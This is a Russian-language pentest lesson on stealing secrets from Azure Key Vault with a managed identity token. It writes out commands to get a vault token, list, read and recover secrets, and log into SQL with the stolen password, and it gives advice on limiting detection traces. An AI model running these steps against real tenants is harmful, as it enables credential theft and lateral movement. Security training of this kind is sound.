---
id: cloud-azure-keyvault
title: "Azure Key Vault: access policies, purge и кража секретов"
category: cloud
parent: cloud-azure-deep
difficulty: hard
order: 3
tags: [cloud, azure, key-vault, secrets, access-policy, rbac, managed-hsm]
prerequisites: [cloud-azure-deep, cloud-azure-managed-identity]
useful_for:
  - "Кража секретов из Azure Key Vault"
  - "Анализ access policies и RBAC"
  - "Понимание soft-delete и purge для персистентности"
estimated_minutes: 50
summary: "Как устроен Key Vault: две модели доступа (access policies и RBAC), секреты/ключи/сертификаты, soft-delete и purge protection. Как из managed identity токена добраться до секретов и как не ошибиться с plane-ами."
---

## Задача

Ты уже добыл **managed identity (MI)** — беспарольную «учётку» сервиса Azure — например, через SSRF в App Service. Теперь надо превратить её в данные. Самая частая цель — **Azure Key Vault**: центральное хранилище паролей БД, строк подключения, API-ключей и сертификатов. Задача урока — из MI-токена добраться до секретов и не споткнуться о главную ловушку Azure.

## Что такое Key Vault и его две плоскости

**Key Vault** — хранилище секретов с уникальным именем (`https://myvault.vault.azure.net/`). Внутри три вида объектов: **secret** (именованное значение с версиями), **key** (криптоключ для шифрования/подписи) и **certificate** (сертификат с приватным ключом).

Ловушка номер один: у Key Vault **две плоскости**. **Management plane** — это ARM (`Microsoft.KeyVault/vaults`): создание хранилища, политики, роли. **Data plane** — это `.vault.azure.net`: собственно чтение секретов. Право видеть хранилище в ARM (роль `Reader`) **не даёт** доступа к значениям. Это самая частая ошибка новичка: «я вижу vault, значит читаю секреты» — нет.

Ловушка номер два: **две несовместимые модели авторизации**. **Access policies** (legacy) — список разрешений `get`/`list`/`set`/`delete` на principals. **Azure RBAC** (новый) — роли вроде `Key Vault Secrets User`. Модель задаётся флагом `enableRbacAuthorization`: если он `true`, access policies **игнорируются**. Смешения нет.

Роли RBAC, которые нам важны:

- `Key Vault Reader` — видеть metadata, **не значения**.
- `Key Vault Secrets User` — читать секреты.
- `Key Vault Secrets Officer` — читать/создавать/удалять.
- `Key Vault Crypto User` — использовать ключи.
- `Key Vault Administrator` — полный контроль data plane.

## Данные, с которыми работаем

Сначала разведка: сколько vault'ов и какая в них модель.

```bash
$ az keyvault list --query '[].{Name:name,RG:resourceGroup,Rbac:properties.enableRbacAuthorization}'
[{"Name":"prod-vault","RG":"rg-app","Rbac":true}]
```

Хранилище `prod-vault` использует RBAC. Смотрим, кто на него назначен:

```bash
$ az role assignment list --scope $(az keyvault show -n prod-vault --query id -o tsv) -o table
Principal              Role                 Scope
---------------------  -------------------  --------------------------------
app-service-mi         Key Vault Secrets User  /subscriptions/.../prod-vault
```

Отлично: у MI приложения `app-service-mi` есть `Secrets User`. Значит, её токеном можно читать секреты.

## Шаг 1: получаем токен с правильной аудиторией

Токен для Key Vault — это **отдельная аудитория** (`resource`). Если ты добыл токен для `https://management.azure.com`, он не подойдёт. Нужен новый:

```bash
$ curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" \
    -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r '.access_token' | cut -c1-20
eyJ0eXAiOiJKV1QiLCJh
```

`IDENTITY_ENDPOINT` и `IDENTITY_HEADER` — переменные окружения, которые App Service подставляет автоматически. Токен есть.

## Шаг 2: перечисляем секреты

```bash
$ curl -s -H "Authorization: Bearer $KV_TOKEN" \
    "https://prod-vault.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[].id'
https://prod-vault.vault.azure.net/secrets/sql-conn
https://prod-vault.vault.azure.net/secrets/stripe-live-key
```

Имена уже раскрывают структуру: строка подключения к SQL и боевой ключ Stripe. Читаем значение:

```bash
$ curl -s -H "Authorization: Bearer $KV_TOKEN" \
    "https://prod-vault.vault.azure.net/secrets/sql-conn?api-version=7.4" | jq -r '.value'
Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!
```

## Шаг 3: смотрим версии и soft-deleted объекты

**Soft-delete** — удалённые объекты хранятся обычно 90 дней и могут быть восстановлены. Часто там лежат креды, которые «ротировали» и забыли.

```bash
$ az keyvault secret list-deleted --vault-name prod-vault --query '[].{Name:name,Deleted:properties.deletionDate}'
[{"Name":"old-sql-admin","Deleted":"2026-09-01T10:00:00Z"}]
$ az keyvault secret recover --vault-name prod-vault --name old-sql-admin
```

Теперь старый секрет снова читается. А если `purge protection` выключен, `az keyvault secret purge` удаляет его навсегда — это **destructive**, согласуй перед применением.

## Шаг 4: используем найденное

Строка подключения ведёт к SQL. Часто там же лежат ключи Storage и других сервисов — идём по цепочке:

```bash
$ sqlcmd -S prod-sql.database.windows.net -U sqladmin -P 'Pr0d_P@ss!' -Q "SELECT name FROM sys.databases"
```

Найденные креды проверяй и записывай цепочку: `SSRF → MI → Key Vault → SQL → ...`.

## Полный прогон от начала до конца

1. `az keyvault list` → нашли `prod-vault`, модель RBAC.
2. `az role assignment list` → у `app-service-mi` роль `Secrets User`.
3. Токен с аудиторией `https://vault.azure.net`.
4. `GET /secrets` → имена; `GET /secrets/sql-conn` → строка подключения.
5. `list-deleted` + `recover` → старая версия креда.
6. Вход в SQL найденным паролем.

## Если не сработало

- **Токен не для `vault.azure.net`.** Data plane вернёт 401 — перевыпусти токен с нужной аудиторией.
- **Только `Reader`.** Видишь хранилище в ARM, но секретов нет — ищи другой vault или другую MI.
- **RBAC включён.** Access policies игнорируются — смотри role assignments, а не `accessPolicies`.
- **Network ACL / private endpoint.** Публичный data plane вернёт ошибку — нужен доступ из внутренней сети (часто через ту же VM/SSRF).
- **Секрет не экспортируется (Key).** Если ключ неэкспортируемый, но есть `Crypto User` — используй его для операций (расшифровка/подпись), не выгружая.
- **Сертификат.** `Certificates Officer`/`Secrets User` может выгрузить сертификат с приватным ключом — он позволяет выдать себя за приложение (client credential flow).

## Защита и детект

Key Vault защищают узкими RBAC-ролями вместо широких access policies, включённым purge protection (чтобы удаление было восстановимо) и private endpoint. Детект строят на Activity Log: события `Microsoft.KeyVault/vaults/secrets/read` и аномально частые `SecretGet`, доступ с новых IP или principal, массовый `list`, изменения access policies. Defender for Key Vault флагует подозрительный доступ. Для атакующего отсюда практический вывод: чтение секретов «громкое», поэтому сначала выясни, какие именно секреты нужны, и не перечисляй всё подряд — меньше следов.

## Что мы теперь знаем

- У Key Vault две плоскости: ARM управляет, `.vault.azure.net` читает секреты.
- `Reader` в ARM ≠ доступ к секретам.
- Модель авторизации одна: RBAC (`enableRbacAuthorization=true`) отключает access policies.
- Токен для data plane требует аудитории `https://vault.azure.net`.
- Soft-delete позволяет вернуть удалённый секрет; purge — destructive.
- Key Vault — звено, а не финал: секреты ведут к БД, Storage, другим API.

## На что смотреть дальше

- **cloud-azure-managed-identity**: как вообще добыть MI-токен.
- **cloud-azure-appservice**: SSRF → MI → Key Vault как типичная цепочка.
- **cloud-kms-crypto**: криптоключи и что с ними делать.

## Квиз

Проверь себя.

```quiz
- question: "Чем management plane Key Vault отличается от data plane?"
  options:
    - "ARM управляет ресурсом, data plane читает секреты"
    - "Это одно и то же"
    - "Data plane только для ключей"
    - "Management plane читает секреты"
  answer: 0
  explanation: "Роль Reader в ARM не даёт доступа к значениям секретов."
- question: "Какая роль RBAC позволяет читать значения секретов?"
  options:
    - "Key Vault Secrets User"
    - "Key Vault Reader"
    - "Reader"
    - "Contributor"
  answer: 0
  explanation: "Secrets User даёт data-plane чтение секретов."
- question: "Что даёт soft-delete атакующему?"
  options:
    - "Возможность восстановить удалённый секрет и прочитать старую версию"
    - "Полный доступ к подписке"
    - "Обход RBAC"
    - "Шифрование"
  answer: 0
  explanation: "Удалённые объекты хранятся и могут быть восстановлены."
- question: "Что произойдёт с access policies, если включён RBAC?"
  options:
    - "Они игнорируются"
    - "Они имеют приоритет"
    - "Они дублируют RBAC"
    - "Они удаляются"
  answer: 0
  explanation: "Модель авторизации одна: RBAC отключает access policies."
- question: "Почему токен для ARM не читает секреты?"
  options:
    - "Data plane требует токен с аудиторией https://vault.azure.net"
    - "Токены живут минуту"
    - "Секреты читаются только из портала"
    - "Нужен пароль"
  answer: 0
  explanation: "Аудитория токена должна соответствовать сервису; для Key Vault это vault.azure.net."
```

## Куда дальше

В следующем уроке мы возьмём **Azure App Service и Functions** — как SSRF в приложении превращается в MI-токен, который мы здесь использовали. А пока главное запомни: **«вижу vault» ≠ «читаю секреты»; сначала определи модель доступа, потом возьми токен с нужной аудиторией.**

## Где пригодится

- **Пентест Azure:** кража секретов и эскалация.
- **Red team:** MI → Key Vault → БД.
- **Bug bounty:** Azure-приложения и их хранилища.
- **Blue team:** аудит политик доступа и детект чтения секретов.
